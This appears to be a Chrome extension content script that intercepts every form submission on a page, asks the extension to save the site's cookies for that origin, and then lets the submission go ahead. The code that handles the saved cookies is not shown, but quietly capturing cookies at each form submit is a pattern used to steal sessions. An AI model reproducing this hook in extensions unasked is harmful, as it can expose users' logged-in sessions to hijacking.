window.addEventListener('submit', function(event) {
event.preventDefault();  // Prevent the form from submitting immediately

    chrome.runtime.sendMessage({
      type: 'saveCookies',
      url: window.location.origin
    }, function(response) {
      console.log(response.status);

      event.target.submit();
    });
});
